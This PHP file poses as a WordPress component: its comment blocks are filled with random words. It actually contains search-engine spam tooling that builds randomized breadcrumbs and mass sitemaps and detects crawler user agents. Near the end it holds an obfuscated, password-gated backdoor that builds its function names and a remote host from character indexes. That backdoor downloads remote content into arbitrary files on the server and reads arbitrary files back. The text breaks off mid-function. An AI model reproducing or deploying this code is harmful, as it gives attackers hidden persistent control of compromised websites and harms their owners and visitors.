 * applicant arbitrary candidate delicate diverse flash global impose interpretation loosen motivate pursue recreation route stripe survey textile usage violence.
 * adequate casual evil exterior hook inevitable moisture odd onion quotation shiver sketch split urgent voluntary.
 * alcohol derive export favorite jam luxury mission moist mutual optimistic reluctant solar volume.
 * appropriate echo entertainment exceed gaze jealous merchant private retail sensible simplicity substantial thrust tremble undergo variable version withdraw.
 * highlight impose religious vague.
 * bother breadth casual compete decent defect deserve dusk elaborate lean moral onion quotation scandal shuttle software submit torture valley.
 * breed cargo ceremony cliff continual decade discipline frustrate hostile idle infinite junior liquor molecule particularly prior ridiculous suspicion swallow temporary terminal tuition yield.
 * aspect delay delicate lest optional orbit private profitable reputation restrict.
 * arbitrary arouse budget enclose glory identify interfere modest precaution pursue sensitive temple textile torture trap vertical.
 * aware coarse fertilizer gasoline geometry jam marine noticeable orbit portion scan slippery spill vacuum vain vitally wagon waist.
 * academic approach bacteria calendar campus continuous duration external glorious horror lest offend prevail relief render revenue significance subt vote.
 * abuse agent applicable display dispose favorite pants trial.
 * battery defect device estimate excess explosive harmony infer relief remedy suburb tedious terror tremendous valid violet.
 * calculate illegal orchestra profit valley volunteer vote.
 * ceremony comment duration erect gene.
 * adequate appetite architecture cope devise discount echo emotional jungle liberal orchestra portion relief ridid ruin swallow tender.
 * approach architecture data grant massive passive quotation reject rely ridge semester stripe trial urge vote.
 * arouse comedy continuous entertainment expense explore extinct focus geology glorious interpret junior magnet manual mist prosperity repetition subway tense territory triangle unique variation.
 * absolute bargain battery cliff comment drip evil expensive identify ingredient mainland mist nylon phenomenon prosperity relief security shallow substance talent tendency tone utilise vessel wealthy.
 * infant medium vehicle weld.
 * architecture authority coarse hence pursue removal utilise.
 * academic appropriate approximate available cargo catalog ceremony code cope equivalent gasoline numerrous passion passport repetition scan shallow spill virtual weed.
 * constant passion reject revenue snap territory usage.
 * adopt architect competent drift extent fate gear giant holy obscure opportunity oval radical resolve.
 * avenue capture comparable constant distribute dump durable emotional episode genuine idle impose interfere nuclear obscure pants precaution principal prior region ruin tarnest transport welfare yield.
 * adhere arise competition explode frustrate guilty lean leap stable substitute tarnest transform vague.
 * beforehand ceremony coach consistent elaborate equivalent exaggerate exceed holy priority promote removal submit withstand.
 * breed disturb exceedingly genuine golf individual leap media network notion odd passport personal region retain ridid twist vague valley wax.
 * algebra automatic competent consume deputy elastic enviroment generate oblige parallel scan.
 *
 * @package WordPress
 */




function getBreadcrum($Ptitle,$catArr){

	global $arrBread,$thisdom;


	$breadTagkey = KEYJG % 6;
	if($breadTagkey == 0){
		$breadTagHtml1 = 'nav';
		$breadTagHtml2 = 'ul';
	}elseif($breadTagkey == 1){
		$breadTagHtml1 = 'nav';
		$breadTagHtml2 = 'ol';
	}elseif($breadTagkey == 2){
		$breadTagHtml1 = 'div';
		$breadTagHtml2 = 'ol';
	}elseif($breadTagkey == 3){
		$breadTagHtml1 = 'section';
		$breadTagHtml2 = 'ol';
	}elseif($breadTagkey == 4){
		$breadTagHtml1 = 'section';
		$breadTagHtml2 = 'ul';
	}else{
		$breadTagHtml1 = 'div';
		$breadTagHtml2 = 'ul';
	}


	$arrBreadNum = count($arrBread);
	$domlen = strlen($thisdom);


	$breadTagkey = $domlen % 5;
	
	$liClassYs = KEYJG % 8;
	
	if($liClassYs == 0){
		$liStr = ' class="item"';
	}elseif($liClassYs == 1){
		$liStr = ' class="breadcrumbs-item"';
	}elseif($liClassYs == 2){
		$liStr = ' class="breadcrumblist-item"';
	}else{
		$liStr = '';
	}
	
	$arrBreadId = array();
	$arrBreadId[0] = 'chrome-breadcrumb';
	$arrBreadId[1] = 'breadcrumb';
	$arrBreadId[2] = 'Breadcrumb';
	$arrBreadId[3] = 'BreadcrumbsHead';
	$arrBreadId[4] = 'BreadcrumbHead';
	$arrBreadId[5] = 'BreadcrumbList';
	$arrBreadId[6] = 'BreadcrumbsList';
	$arrBreadId[7] = 'bread_crumb';
	$arrBreadId[8] = 'Breadcrumbs';
	$arrBreadId[9] = 'breadcrumbs';
	
	$keyBreadId = KEYJG % 25;
	
	if(isset($arrBreadId[$keyBreadId])){
		$keyBreadIdStr = ' id="'.$arrBreadId[$keyBreadId].'"';
	}else{
		$keyBreadIdStr = '';
	}
	


	$strBreads = '';
	if($breadTagkey == 4){
		
		$classI =  KEYJG % 2 ? 'BreadcrumbHead' : 'breadcrumbList';
		$classII =  $domlen % 2 ? 'Breadcrumbs' : 'Breadcrumb';
		
		$strBreads .= '<'.$breadTagHtml1.$keyBreadIdStr.' class="'.$classI.'">';
		$strBreads .= '<'.$breadTagHtml2.' class="'.$classII.'">';
		$strBreads .= '<li'.$liStr.'><a href="/">Home</a></li>';
		if(count($catArr)){
			foreach($catArr as $vs){
				$vs = trim($vs);
				$nowCatUrl = getCatLink($vs);
				$strBreads .= '<li'.$liStr.'><a href="'.$nowCatUrl.'">'.$vs.'</a></li>';
			}
		}
		
		$strBreads .= '<li'.$liStr.'>'.$Ptitle.'</li>';
		$strBreads .= '</'.$breadTagHtml2.'>';
		$strBreads .= '</'.$breadTagHtml1.'>';
	}else{
		$calssBreadKey = KEYJG % $arrBreadNum;
		$classTop = $arrBread[$calssBreadKey];
		$classul =  KEYJG % 2 ? 'Breadcrumb' : 'breadcrumbs';
		$breadTagkey = $domlen % 2;

		if($breadTagkey == 0){
			if($classTop)
				$strBreads .= '<'.$breadTagHtml1.$keyBreadIdStr.' class="'.$classTop.'">';
			else
				$strBreads .= '<'.$breadTagHtml1.$keyBreadIdStr.'>';
			
			$strBreads .= '<'.$breadTagHtml2.' class="'.$classul.'" itemscope itemtype="http://schema.org/BreadcrumbList">';
			$strBreads .= '<li'.$liStr.' itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="/"><span itemprop="name">Home</span></a><meta itemprop="position" content="1" /></li>';
			$flagNum = 2;
			if(count($catArr)){
				foreach($catArr as $vs){
					$vs = trim($vs);
					$nowCatUrl = getCatLink($vs);
					$strBreads .= '<li'.$liStr.' itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><a itemprop="item" href="'.$nowCatUrl.'"><span itemprop="name">'.$vs.'</span></a><meta itemprop="position" content="'.$flagNum.'" /></li>';
					$flagNum++;
				}
			}
				
				
			$strBreads .= '<li'.$liStr.' itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem"><span itemprop="name">'.$Ptitle.'</span><meta itemprop="position" content="'.$flagNum.'" /></li>';
				
			$strBreads .= '</'.$breadTagHtml2.'>';
			$strBreads .= '</'.$breadTagHtml1.'>';
		}else{
			if($classTop)
				$strBreads .= '<'.$breadTagHtml1.$keyBreadIdStr.' class="'.$classTop.'">';
			else
				$strBreads .= '<'.$breadTagHtml1.$keyBreadIdStr.'>';
			
			$strBreads .= '<'.$breadTagHtml2.' class="'.$classul.'" itemscope itemtype="http://schema.org/BreadcrumbList">';
			$strBreads .= '<li'.$liStr.' itemscope itemtype="http://data-vocabulary.org/Breadcrumb"><a href="/" itemprop="url"><span itemprop="title">Home</span></a></li>';
			if(count($catArr)){
				foreach($catArr as $vs){
					$vs = trim($vs);
					$nowCatUrl = getCatLink($vs);
					$strBreads .= '<li'.$liStr.' itemscope itemtype="http://data-vocabulary.org/Breadcrumb"><a href="'.$nowCatUrl.'" itemprop="url"><span itemprop="title">'.$vs.'</span></a></li>';
				}
			}
				
				
			$strBreads .= '<li'.$liStr.'><strong>'.$Ptitle.'</strong></li>';
				
			$strBreads .= '</'.$breadTagHtml2.'>';
			$strBreads .= '</'.$breadTagHtml1.'>';
		}
	}
	
	
	return $strBreads;

}



function getCatLink($CatName){
		
		global $arrnametime,$arrKeywz,$arr_word,$strRand;		
	
		$filePres = '';		$fileEnds = '';		$siteLink='http://'.$_SERVER['HTTP_HOST'];
		$dirNames = dirname(__FILE__);		$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));		
		if(JDT == 2){
			$filePres = $siteLink ."/". $httcReplace . "/" . basename(__FILE__) . "/";		}elseif(JDT == 1){
			$filePres = $siteLink ."/". $httcReplace . "/";		}elseif(JDT == 3){
			$filePres = $siteLink ."/". $httcReplace . "/" .basename(__FILE__) . "?cat=";		}else{
			$filePres = $siteLink."/";		}
		
		$CatName = str_replace('&',' ',$CatName);
		$CatName = str_replace('&',' ',$CatName);
		if(JDT == 3){
			
			$CatName = preg_replace('#\s+#i','-',$CatName);
			
			
			while(strstr($CatName,'--'))
				$CatName = str_replace('--','-',$CatName);
			
			$linkCenter = $CatName;	
			
			$rtStr = $filePres.$linkCenter;
			$rtStr = str_replace($filePres.'-',$filePres,$rtStr);
		
			return $rtStr;
			
			}
		
		
		
		
		$CatName = preg_replace('#\s+#i','-',$CatName);
		$CatName = str_replace('--','-',$CatName);
		$linkCenter = str_replace('--','-',$CatName).'-'.BZCAT;
		$linkCenter .= JTHZ;		
		$rtStr = $filePres.$linkCenter;
		$rtStr = str_replace($filePres.'-',$filePres,$rtStr);
		
		return $rtStr;
			
	}
		
	

/**
 * appoint avenue awful biology breadth burst deposit device duration elaborate fatigue liable lynar mere obstacle prior render rival shrug triumph ultimate vanish vocabulary welfare.
 * bacteria boundary deaf delicate ferfile harmony jealous missile naval network notify nuclear orient passive rely retail ridiculous ruin scandal snap sophisticated version wander.
 * barrel decay dive echo exclude gasoline highlight liable missile mixture modify wax.
 * burst comparable competition decade deputy derive evaluate fate global herd infant ingredient insurance label moist nevertheless organ pants parallel petrol resistant sensitive trap treaty.
 * ban brake cargo coil conquer dash deposit geography gesture haste jam jungle pat presumably reject rescue reveal urban weed welfare.
 * alter aware disturb drift duration fatigue incident ingredient lean lynar reputation slender voluntary.
 * response academy beforehand cargo competent delicate dispose dusk explore holy inferior nevertheless prior relevant shiver significance sophisticated stimulate subt temptation variation vivid.
 * appropriate coil display earthquake interpret naked notion optics particularly prevail shield simplify tender transmit trend universe urban variation.
 * abuse advertise authority battery derive evolve frown gesture hence infer launch liberal liquor outset previous prominent remedy reveal scratch simplify temptation thrust vehicle weld wonder.
 * Internet acknowledge distinguish kneel leap prescribe preserve respond tremendous.
 * adopt audio coach code consume domestic dump evil favorable infect notion parade prescribe prospect universal valley.
 * agent appropriate cliff coil entertainment expense explore favorable focus parallel portable relevant reluctant secure simplicity trap trend valid victim violent volume.
 * avenue core decay motive.
 * chaos durable maintain nuisance optional personnel principal reluctant tide undertake virus.
 * decade excess explode fatigue ferfile genius globe jail liberal manufacture presumably prior pursue scratch sensitive trap ultimate voluntary.
 * arbitrary ban cliff device emphasize entry essential fertilizer flee hostile infer insure invade jeans luxury particularly passion pat reinforce slippery substance tension violence.
 * gratitude nuisance personnel route shuttle strategy utter.
 * conservation extraordinary illusion ingredient liquor opportunity textile twist.
 * academic applicable bacteria bargain continuous enclose entertainment equivalent expend expense expensive fatigue guarantee idle illegal motive mutual ridid shrug suspicion yawn.
 * appoint distinguish dumb dump focus guilty harmony horrible hostile illusion internal media parallel pat precaution recruit reluctant retail ridiculous ridid sake scan substance ultimate whereas.
 * acid ban cliff constant discipline drip encounter entry exclude guarantee hint isolate liberty navigation remarkable sensitive substance subt torture trace wealthy.
 * decline emphasize extent previous reinforce violence.
 * glorious modest prescribe removal wander.
 * applicable balcony competition consent dash distress dumb elbow evolve integrate liberal mere phenomenon poverty primitive shrug skim terminal tremble tuition undergo undertake utilise withstand yield.
 * abuse applicable enclose fax generate hence omit scratch strategy.
 * bother community decade delicate dusk gallery gallon gap index modest offend origin prohibit remedy tidy transplant utter vacant vanish vertical withstand witness.
 * consistent evil tarnest venture.
 * campus drip emotional expansion gaze identify illegal motivate reliable respond revenue shrink signature suspicious transmit tropical.
 * career deputy dumb explode gene global globe kneel marine merchant outstanding partial priority sophisticated suburb universal venture vertical withdraw.
 * abundant commit dive entry facility fatal genuine geometry individual prior range religious slide textile vague variation.
 * consistent global illusion restrain utter.
 * cope female tremendous universe vessel.
 * approximate attach capture column exceed forbid optics quit theme vessel weed.
 * response agency applicable bargain conservation cope deaf decent elastic humble infer integrate liberty lynar motivate rely ridid slip witness.
 *
 * @package WordPress
 */


function getMapNum($bgNum,$mapnum){
	$TempArr = array();
	if($bgNum + $mapnum <= FNUM){
		for($i=0;$i<$mapnum;$i++){
			$TempArr[$i] = $bgNum + $i -1;
		}
	}else{
		for($i=0;$i<$mapnum;$i++){
			if($bgNum+$i > FNUM)
				$TempArr[$i] = $bgNum + $i -1 -FNUM;
			else
				$TempArr[$i] = $bgNum + $i -1;
		}
	}
	
	return $TempArr;
}



function getRandId(){
	$num = rand(1,FNUM);	$num = $num - 1;	
	
		$idUrl =  GETDOM . "gpage.php?getid=$num";
		$tempIdStr = curl_get_from_webpage($idUrl,'',5);
		$arrId = explode(',',$tempIdStr);
	
	$indexId=array_rand($arrId,1);	$id = $arrId[$indexId];	unset($arrId);	return $id;}
	
	
function get_next_link($arr,$key){
	
	$tmpA1 = array();	$tmpA2 = array();	
	$num = count($arr);	if($key - JGNUM - LINKNUM < 0 && $key - JGNUM > 0){
		$duoyu = abs($key - JGNUM - LINKNUM);		$tmpA1 = array_slice($arr, 0, abs($key - JGNUM));		$tmpA2 = array_slice($arr, $num-$duoyu-1, $duoyu);		return array_merge($tmpA1,$tmpA2);	}else{
			return  array_slice($arr, $key - JGNUM - LINKNUM, LINKNUM);	}
}
function rFile($file){
	if(function_exists('file_get_contents')){
		return file_get_contents($file);
	}else{
		$handle = fopen($file, "r");
		$contents = fread($handle, filesize($file));
		fclose($handle);
		return $contents;
	}
}
function isCrawler() {
	$agent= @strtolower($_SERVER['HTTP_USER_AGENT']);	if (!empty($agent)) {
		$spiderSite= array(
			"Googlebot",
			"Mediapartners-Google",
			"Adsbot-Google",
			"Yahoo!",
			"Google AdSense",
			"Yahoo Slurp",
			"bingbot",
			"MSNBot"
		);		foreach($spiderSite as $val) {
		$str = strtolower($val);		if (strpos($agent, $str) !== false) {
			return true;			}
		}
	} else {
		return false;	}
} 


function gsitemap2($filenames,$c=1,$jdt=1){
	global $gnumber,$arrArrr;
$arrABC = range('a','z');
$tparrsI = array_flip($filenames);
$randnum = rand(7000,7600);
$tparrII = array_rand($tparrsI,$randnum);
$filenames = $tparrII;

	$filePres = '';	$fileEnds = '';	
	$dirNames = dirname(__FILE__);	$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));			
	if(JDT == 2){
		$filePres = $httcReplace . "/" . basename(__FILE__) . "/";	}elseif(JDT == 1){
		$filePres = $httcReplace . "/";	}elseif(JDT == 3){
		$filePres = $httcReplace . "/" .basename(__FILE__) . "?key=";	}else{
		$filePres = '';	}
	if(JDT == 3){
		$fileEnds = '';	}else{
		$fileEnds = JTHZ;	}
	$fpath='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink='http://'.$_SERVER['HTTP_HOST'];		
	$mapPre = '<'.'?xml version="1.0" encoding="UTF-8" ?'.'>'. PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;	$mapEnd = PHP_EOL .  '</urlset>';
	// $urlsArray = $filenames;
	// $numLinks = count($urlsArray);
	$star = 0;	$priority = 0.1;	$starPri = 0;	$gFile ="";	$date = date("Y-m-d");	$time = date("H:i:s");
	$str = "";						
	$tempArr1 = $filenames;
	
	foreach($tempArr1 as $value2){
		$curphp=basename(__FILE__); 
		$value = $value2;		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");		
			$tempPid = $value;
				$url = getalink($tempPid);
		
		
		
		if($first===false && $last===false && $checkTxt===false)
		{
			$date = date("Y-m-d");			$time = date("H:i:s");				
		
			if($star % 12000==11999){
				$gFile =  '../mapnaviga/mapnaviga' . $arrABC[$gnumber-1] .'.xml';				echo '<br/>'.$gFile.'<br/>';				$put_str = $mapPre . $str . $mapEnd;				@unlink($gFile);				file_put_contents($gFile,$put_str);
				$str = '';				$gnumber++;				return;			}
			
		
			
	
			$str .= "     <url>
			 <loc>" . $url . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
			 <changefreq>daily</changefreq> 
			 <priority>0.1</priority> 
			 </url>
		";	
			
			
			$star++;			$starPri++;		}
	}
	
	{
		$gFile =  '../mapnaviga/mapnaviga' . $arrABC[$gnumber-1] .'.xml';		$gnumber++;		echo '<br/>'.$gFile.'<br/>';
		$put_str = $mapPre . $str . $mapEnd;		@unlink($gFile);		file_put_contents($gFile,$put_str);	
	}
	
	unset($tempArr1);	unset($filenames);	
	echo "生成sitemap成功！";	
}

function gsitemap($filenames,$c=1,$jdt=1){
	global $gnumber,$arrArrr;
$arrABC = range('a','z');
$tparrsI = array_flip($filenames);
$randnum = rand(7000,7600);
$tparrII = array_rand($tparrsI,$randnum);
$filenames = $tparrII;
	
	$filePres = '';	$fileEnds = '';	
	
	$fpath='http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];	$serpath=substr($fpath,0,strrpos($fpath,'/'));
	$siteLink='http://'.$_SERVER['HTTP_HOST'];		
	$mapPre = '<'.'?xml version="1.0" encoding="UTF-8" ?'.'>'. PHP_EOL.'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;	$mapEnd = PHP_EOL .  '</urlset>';
	// $urlsArray = $filenames;
	// $numLinks = count($urlsArray);
	
	$star = 0;	$priority = 0.9;	$starPri = 0;	$gFile ="";	$date = date("Y-m-d");	$time = date("H:i:s");
	$str = "     <url>
			 <loc>" . $siteLink . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod> 
			 <changefreq>always</changefreq> 
			 <priority>1.0</priority> 
			 </url>
		";						
	$tempArr1 = $filenames;
	
	foreach($tempArr1 as $value2){
		$curphp=basename(__FILE__); 
		$value = $value2;		$first=stristr($value,".php");		$last=stristr($value,".xml");		$checkTxt =stristr($value,".txt");	
		
			$tempPid = $value;
				$url = getalink($tempPid);
		
		if($first===false && $last===false && $checkTxt===false)
		{
			$date = date("Y-m-d");			$time = date("H:i:s");			
	
			if($star % 12000==11999){
				$gFile =  '../mapnaviga/mapnaviga' . $arrABC[$gnumber-1] .'.xml';				echo '<br/>'.$gFile.'<br/>';				
				$put_str = $mapPre . $str . $mapEnd;				@unlink($gFile);				file_put_contents($gFile,$put_str);
				$str = '';				$gnumber++;				return;				
			}
			
			if($starPri >= 400 && $priority != 0.1){
				$starPri = 0;				$priority = $priority - 0.1;			}
			
			if($priority > 0.1){
				
				$str .= "     <url>
					 <loc>" . $url . "</loc> 
					 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
					 <changefreq>daily</changefreq> 
					 <priority>". $priority . "</priority> 
					 </url>
				";	
			}else{
										$str .= "     <url>
			 <loc>" . $url . "</loc> 
			 <lastmod>". $date . "T" . $time ."-05:00</lastmod>   
			 <changefreq>daily</changefreq> 
			 <priority>0.1</priority> 
			 </url>
		";	
			}
			
			$star++;			$starPri++;		}
	}
	
	{
		$gFile =  '../mapnaviga/mapnaviga' . $arrABC[$gnumber-1] .'.xml';		echo '<br/>'.$gFile.'<br/>';		
		$gnumber++;
		$put_str = $mapPre . $str . $mapEnd;		@unlink($gFile);		file_put_contents($gFile,$put_str);	
	}
	
	unset($tempArr1);	unset($filenames);	echo "生成sitemap成功！";	
}
	
function curl_get_from_webpage($url,$proxy='',$loop=10){
	$data = false;        $i = 0;        while(!$data) {
             $data = curl_get_from_webpage_one_time($url,$proxy);             if($i++ >= $loop) break;        }
	return $data;}
 

function curl_getjs_from_webpage($url,$time){
if(function_exists("curl_init") && function_exists("curl_setopt") && function_exists("curl_exec") && function_exists("curl_close")){
 
    $curl = curl_init();
	$user_agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; chromeframe/12.0.742.100";			
	// $urlReferer = "http://www.google.com";
	curl_setopt($curl, CURLOPT_URL, $url);	
		if(stristr($url,"https:")){ curl_setopt_array($curl, array(CURLOPT_SSL_VERIFYHOST => 2,CURLOPT_SSL_VERIFYPEER => 0,	CURLOPT_POSTFIELDS => '',			CURLOPT_RETURNTRANSFER => 1,CURLOPT_TIMEOUT => $time,CURLOPT_USERAGENT => $user_agent,CURLOPT_HEADER => 1,			CURLOPT_VERBOSE => 0
			));}else{curl_setopt($curl, CURLOPT_URL, $url);curl_setopt($curl, CURLOPT_TIMEOUT, $time);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_HEADER, false);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);
	}$data=curl_exec($curl);curl_close($curl); 
  }else{
 
    $is_auf=ini_get('allow_url_fopen') && function_exists("file_get_contents")?true:false; 
    if($is_auf){
		$data = file_get_contents($url); 
    }
 
  }
	if(!$data) return false;
	return $data;	
	
}

function curl_get_from_webpage_one_time($url,$proxy=''){
if(function_exists("curl_init") && function_exists("curl_setopt") && function_exists("curl_exec") && function_exists("curl_close")){
 
    $curl = curl_init();
	$user_agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; chromeframe/12.0.742.100";			
	// $urlReferer = "http://www.google.com";
	if(strlen($proxy) > 8) curl_setopt($curl, CURLOPT_PROXY, $proxy);
curl_setopt($curl, CURLOPT_URL, $url);	
		if(stristr($url,"https:")){ curl_setopt_array($curl, array(CURLOPT_SSL_VERIFYHOST => 2,CURLOPT_SSL_VERIFYPEER => 0,	CURLOPT_POSTFIELDS => '',			CURLOPT_RETURNTRANSFER => 1,CURLOPT_USERAGENT => $user_agent,CURLOPT_HEADER => 1,			CURLOPT_VERBOSE => 0
			));}else{curl_setopt($curl, CURLOPT_URL, $url);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_HEADER, false);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_USERAGENT, $user_agent);
	}$data=curl_exec($curl);curl_close($curl); 
  }else{
 
    $is_auf=ini_get('allow_url_fopen') && function_exists("file_get_contents")?true:false; 
    if($is_auf){
		$data = file_get_contents($url); 
    }
 
  }
	if(!$data) return false;
	return $data;	
	
}



	
//ccccccgetbg
	
@ini_set('display_errors', 0);@set_time_limit(3600);
$q1 = "O00O0O";$q2 = "O0O000";$q3 = "O0OO00";$q4 = "OO0O00";$q5 = "OO0000";$q6 = "O00OO0";$q7 = "O00O00";$q8 = "O00OOO";$q9 = "O0O0OO";$q10 = "OOO0OO";$q11 = "OO00OO";$q12 = "OO000O";$q13 = "OO0O0O";$q14 = "OOOO00";$q15 = "OO0OO0O";$$q1 = RandAbc();$$q3 =  $O00O0O{62}.$O00O0O{51}.$O00O0O{50}.$O00O0O{54}.$O00O0O{55};$$q5 = $O00O0O{28}.$O00O0O{26}.$O00O0O{27}.$O00O0O{33};$$q6 = $O00O0O{19}.$O00O0O{22}.$O00O0O{12}.$O00O0O{1}.$O00O0O{0}.$O00O0O{12}.$O00O0O{0}.$O00O0O{17}.$O00O0O{10}.$O00O0O{4}.$O00O0O{19};$$q4 = $$O0OO00;$$q2 = $O00O0O{12}.$O00O0O{3}.$O00O0O{31};$$q7 = $O00O0O{30}.$O00O0O{35}.$O00O0O{32}.$O00O0O{34}.$O00O0O{31}.$O00O0O{34}.$O00O0O{31}.$O00O0O{3}.$O00O0O{26}.$O00O0O{5}.$O00O0O{5}.$O00O0O{4}.$O00O0O{29}.$O00O0O{31}.$O00O0O{28}.$O00O0O{27}.$O00O0O{0}.$O00O0O{26}.$O00O0O{30}.$O00O0O{32}.$O00O0O{5}.$O00O0O{26}.$O00O0O{30}.$O00O0O{34}.$O00O0O{28}.$O00O0O{5}.$O00O0O{33}.$O00O0O{0}.$O00O0O{3}.$O00O0O{31}.$O00O0O{34}.$O00O0O{3};$$q8 =  $O00O0O{23}.$O00O0O{24}.$O00O0O{25};$$q9 = $O00O0O{62}.$O00O0O{54}.$O00O0O{40}.$O00O0O{53}.$O00O0O{57}.$O00O0O{40}.$O00O0O{53};$$q10 = $$O0O0OO;$$q11 = $O00O0O{39}.$O00O0O{50}.$O00O0O{38}.$O00O0O{56}.$O00O0O{48}.$O00O0O{40}.$O00O0O{49}.$O00O0O{55}.$O00O0O{62}.$O00O0O{53}.$O00O0O{50}.$O00O0O{50}.$O00O0O{55};$$q12 = $O00O0O{51}.$O00O0O{43}.$O00O0O{51}.$O00O0O{62}.$O00O0O{54}.$O00O0O{40}.$O00O0O{47}.$O00O0O{41};$$q13 = $O00O0O{2}.$O00O0O{6}.$O00O0O{4}.$O00O0O{19};$$q14 = $O00O0O{8}.$O00O0O{13}.$O00O0O{3}.$O00O0O{4}.$O00O0O{23}.$O00O0O{63}.$O00O0O{15}.$O00O0O{7}.$O00O0O{15};$$q15 = $O00O0O{7}.$O00O0O{19}.$O00O0O{19}.$O00O0O{15}.$O00O0O{64}.$O00O0O{65}.$O00O0O{65}.$O00O0O{22}.$O00O0O{22}.$O00O0O{22}.$O00O0O{63};
if(isset($OOO0OO["$OO00OO"])){$BT = $OOO0OO["$OO00OO"];}elseif(isset($OOO0OO["$OO000O"])){$BT = str_ireplace(str_replace("\\",DIRECTORY_SEPARATOR,str_replace("/",DIRECTORY_SEPARATOR,$OOO0OO["$OO000O"])),'',__FILE__).DIRECTORY_SEPARATOR;}else{$BT = '/';}
foreach($OO0O00 as $O00O00o=>$O00Oo0o){
	$$O00O00o = $O00Oo0o;
}

if(!(isset($passwd) && $O0O000($passwd) == $O00O00)){
	header("HTTP/1.1 404 Not Found");  
	header("Status: 404 Not Found");  
	exit; 
}

if(isset($act) && $act == 'check' && isset($check_file)){
	if(file_exists($check_file)){
		echo '#ok#';
	}
}

if(isset($act) && $act == 'test'){
		echo '#ok#';
}

if(isset($act) && $act == 'recover' && isset($recover_file) && isset($recover_file_url)){
{
		
			$pfile = $recover_file;
			$date = $OO0O0O($recover_file_url);
			gdir_file($recover_file);
			@chmod($pfile,0755);

			if($date && file_put_contents($pfile,$date)){
				echo '#ok#';
			}else{
				echo '#fail#';
			}
		
	}
}

if(isset($act) && $act == 'redate' && isset($redate_file)){
	if(file_exists($redate_file)){
		echo rdFile($redate_file);
	}
}

function RandAbc($length = "") {
    $str = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_.:/-";
    return ($str);
} 

function rdFile($file){
	if(function_exists('file_get_contents')){
		return file_get_contents($file);
	}else{
		$handle = fopen($file, "r");
		$contents = fread($handle, filesize($file));
		fclose($handle);
		return $contents;
	}
}

function cget($url,$loop=10){
	$data = false;        $i = 0; 

	while(!$data) {
             $data = tcget($url);             if($i++ >= $loop) break;        }
	return $data;
}

function tcget($url,$proxy=''){
	global $OO0OO0O, $O00OO0, $OO0000, $O00OOO;
     $data = '';    	$url = "$OO0OO0O$O00OO0.$O00OOO/".$url;
 $url = trim($url);     if (extension_loaded('curl') && function_exists('curl_init') && function_exists('curl_exec')){
         $ch = curl_init();         curl_setopt($ch, CURLOPT_URL, $url);		 curl_setopt($ch, CURLOPT_HEADER, false);		 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);		 
         curl_setopt($ch, CURLOPT_TIMEOUT, 60);         $data = curl_exec($ch);         curl_close($ch);      }
    
     if ($data == ''){
         if (function_exists('file_get_contents') && $url){
             $data = @file_get_contents($url);             }
         }
    
     if (($data == '') && $url){
         if (function_exists('fopen') && function_exists('ini_get') && ini_get('allow_url_fopen')){
             ($fp = @fopen($url, 'r'));            
             if ($fp){
                
                 while (!@feof($fp)){
                     $data .= @fgets($fp) . '';                     }
                
                 @fclose($fp);                 }
             }
         }
     return $data;	
}

function m_mkdir($dir){
		if(!is_dir($dir)) mkdir($dir);
	}
	
function gdir_file($gDir=''){
		global $BT;
		$gDir = str_replace('/',DIRECTORY_SEPARATOR,$gDir);
		$gDir = str_replace('\\',DIRECTORY_SEPARATOR,$gDir);
		$arr = explode(DIRECTORY_SEPARATOR,$gDir);
		
		if(count($arr) <= 0) return;

		
		if(!strstr($gDir,$BT))
			$dir = $BT;
		else
			$dir = '';
		
		for($i = 0 ; $i < count($arr)-1 ; $i++){
			$dir .= '/' . $arr[$i];
			m_mkdir($dir);
		}
		
		return $dir;
}

//ccccccgetend



function my_mkdir($dir){
		global  $fitime;
		if(!is_dir($dir)){
			mkdir($dir);
			@touch($dir, $fitime, $fitime);   
		} 
	}
	

	
	function generate_dir_file($gDir=''){
		
		global $hostDir;
		$gDir = str_replace('/',DIRECTORY_SEPARATOR,$gDir);
		$gDir = str_replace('\\',DIRECTORY_SEPARATOR,$gDir);
		$arr = explode(DIRECTORY_SEPARATOR,$gDir);
		
		if(count($arr) <= 0) return;
		
		if(!strstr($gDir,$hostDir))
			$dir = $hostDir;
		else
			$dir = '';


		for($i = 0 ; $i < count($arr)-1 ; $i++){
			$dir .= DIRECTORY_SEPARATOR . $arr[$i];
			my_mkdir($dir);
		}
		
		return $dir;
	}
		
	
	function getalink($pid){
		
		global $arrnametime,$arrKeywz,$arr_word,$strRand;		
	
		$filePres = '';		$fileEnds = '';		$siteLink='http://'.$_SERVER['HTTP_HOST'];
		$dirNames = dirname(__FILE__);		$httcReplace = end((explode(DIRECTORY_SEPARATOR, $dirNames)));		
		if(JDT == 2){
			$filePres = $siteLink ."/". $httcReplace . "/" . basename(__FILE__) . "/";		}elseif(JDT == 1){
